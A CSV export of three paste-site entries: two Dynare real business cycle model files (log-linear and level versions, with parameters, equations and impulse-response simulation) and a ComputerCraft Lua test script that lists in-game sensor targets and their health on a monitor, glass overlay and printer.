id,title,username,language,date,content
JbggzvZb,rbc_log.mod,thanhqtran,MatLab,Friday 11th of July 2025 10:35:35 PM CDT,"// RBC log
var y c i n r w k A;
varexo e;

// params
parameters alpha beta sigma phi delta rhoa;
alpha = 0.63;
beta = 0.985;
sigma = 2;
phi = 1.5;
delta = 0.025;
rhoa = 0.95;

// model block
model(linear);

#Rss = (1/beta)-(1-delta);
#Wss = (1-alpha)*((alpha/Rss)^(alpha/(1-alpha))); 
#Yss = ((Rss/(Rss-delta*alpha))^(sigma/(sigma+phi))) *(((1-alpha)^(-phi))*((Wss)^(1+phi)))^(1/(sigma+phi));
#Kss = alpha*(Yss/Rss);
#Iss = delta*Kss;
#Css = Yss - Iss;
#Lss = (1-alpha)*(Yss/Wss);


//1-Consumption-labor supply
sigma*c + phi*n = w;
//2-Euler equation
(sigma/beta)*(c(+1)-c) = Rss*r(+1);
//3-Law of motion of capital
k = (1-delta)*k(-1) + delta*i;
//4-production function
y = A + alpha*k(-1) + (1-alpha)*n;
//5-demand for capital
r = y - k(-1);
//6-demand for labor
w = y - n;
//7-Equilibrium condition
Yss*y = Css*c + Iss*i;
//8-Productivity shock
A = rhoa*A(-1) + e;
end;

steady(maxit=1000);
check; 
model_diagnostics; 
model_info;

shocks;
var e; 
stderr 0.01; 
end;

stoch_simul(order=1, irf=80, tex) y c n w r i k A;"
ARHmta6Q,rbc.mod,thanhqtran,MatLab,Friday 11th of July 2025 10:30:32 PM CDT,"// RBC level
var Y C N W R I K A;
varexo e;

// params
parameters alpha beta sigma phi delta rhoa theta;
alpha = 0.35;
beta = 0.98;
sigma = 2;
phi = 1.5;
delta = 0.025;
rhoa = 0.95;
theta = 1;

// model block
model;
#Ass = 1;
//1-Consumption-labor supply
(C^sigma) * (theta * N^phi) = W;
//2-Euler equation
(C(+1)/C)^sigma = beta * (R(+1) + 1 - delta);
//3-Law of motion of capital
K = (1-delta)*K(-1) + I;
//4-production function
Y = A * K(-1)^alpha * N^(1-alpha);
//5-demand for capital
K(-1) = alpha * Y/R;
//6-demand for labor
N = (1-alpha) * Y/W;
//7-Equilibrium condition
Y = C + I;
//8-Productivity shock
A = exp( (1-rhoa)*log(Ass) + rhoa*log(A(-1)) + e);
end;

initval;
A = 1;
K = 10;
N = 0.3;
C = 1;
I = 0.25;
Y = 1.25;
R = 0.04;
W = 1;
end;



steady(maxit=1000);
check; 
model_diagnostics; 
model_info;

shocks;
var e; 
stderr 0.01; 
end;

stoch_simul(order=1, irf=40, tex) Y C N W R I K A;"
sJkvkUrP,Computercraft - Sensor test program,Rolcam,Lua,Friday 11th of July 2025 09:47:04 PM CDT,"--This is just a test prorgam so I can get familiar with various computercraft peripherals. Please excuse the mess.

-- load the API
os.loadAPI(""ocs/apis/sensor"")



-- Change the peripheral names accordingly
-- Prox = sensor (requires a proximity card) | mon = monitor | glass = terminal glass bridge | printer = printer
prox = sensor.wrap(""top"")
mon = peripheral.wrap(""left"")
glass = peripheral.wrap(""right"")
-- Set this to 0 to disable printing
printReadout = 1 
printer = peripheral.wrap(""bottom"")

-- get the targets
local targets = prox.getTargets()

--Redirects output to monitor
term.redirect(mon)
term.clear()
term.setCursorPos(1,1)
term.setTextColor(colors.yellow)
print(""Sensor Readout - Entities:"")
print()

glass.clear()
--List
glass.addBox(348,1,180,200,0xFFFFFF, 0.2)
glass.addText(350,2,""Radar Readout:"", 0xF2B233)
glassY = 12
-- Page tracker for printer
pgCt = 1

term.setTextColor(colors.white)
if printReadout == 1 then
	printer.newPage()
	printer.setPageTitle(""Radar Printout Page "" .. pgCt)
	-- Y value tracker for printer - will start a new page once it gets to the bottom
	printY = 1

	-- Updates the cursor position on the page = for printer
	printer.setCursorPos(1,printY)
end
-- Checks if the page is full. If so, it starts a new page
function printCheck ()
    if printY > 21 then
        -- Ends the page
        printer.endPage()
        -- Adds one to the page counter
        pgCt = pgCt + 1
        -- Starts a new page
    	printer.newPage()
		printer.setPageTitle(""Radar Printout Page "" .. pgCt)
        -- Resets printer Y position to 1
		printY = 1
		printer.setCursorPos(1,printY)
    end
end

-- loop through targets from sensor
for name, basicDetails in pairs(targets) do

    -- get more details about them
  local moreDetails = prox.getTargetDetails(name)
    -- Changes the text color to yellow if it lists a player. Otherwise, it's white
  if moreDetails.IsPlayer == true then
        term.setTextColor(colors.yellow)
        print(""Found player: ""..name)
        if printReadout == 1 then
        	printer.setCursorPos(1,printY)
        	printer.write(""Found player: ""..name)
        	printY = printY + 1
        	printCheck()
        end
  else
        term.setTextColor(colors.white)
        print(""Found entity: ""..name)
        if printReadout == 1 then
        	printer.write(""Found entity: ""..name)
        	printY = printY + 1
        	printCheck()
        end
  end
    
    
  -- print their health
  print(""Health: ""..moreDetails.Health)
  if printReadout == 1 then
  	printer.setCursorPos(1,printY)
  	printer.write(""Health: ""..moreDetails.Health)
  	printY = printY + 1
  	printCheck()
  end
  term.setTextColor(colors.white)
  print(""------"")
  if printReadout == 1 then
  	printer.setCursorPos(1,printY)
  	printer.write(""------"")
  	printY = printY + 1
  	printCheck()
  end
end

if printReadout == 1 then
	printer.endPage()
end
term.restore()

function glassCheck()
    if glassY > 200 then
        sleep(5)
        glass.clear()
        glass.addBox(348,1,180,200,0xFFFFFF, 0.2)
		glass.addText(350,2,""Radar Readout:"", 0xF2B233)
		glassY = 12
    end
end

-- loop through targets from sensor
for name, basicDetails in pairs(targets) do
    
     -- get more details about them
  local moreDetails = prox.getTargetDetails(name)
    -- Changes the text color to yellow if it lists a player. Otherwise, it's white
if moreDetails.IsPlayer == nil then  
        glass.addText(350,glassY,""Found ??????: ""..name, 0xF2B233)
        glassY = glassY + 10
    	glassCheck()
elseif moreDetails.IsPlayer == true then
        glass.addText(350,glassY,""Found player: ""..name, 0xF2B233)
        glassY = glassY + 10
    	glassCheck()
  else
        glass.addText(350,glassY,""Found entity: ""..name, 0x000000)
        glassY = glassY + 10
    	glassCheck()
  end
    
  -- print their health
  glass.addText(350,glassY,""Health: ""..moreDetails.Health, 0x000000)
  glassY = glassY + 10
  glassCheck()
  glass.addText(350,glassY,""------"", 0x000000)
  glassY = glassY + 10
  glassCheck()
end
"
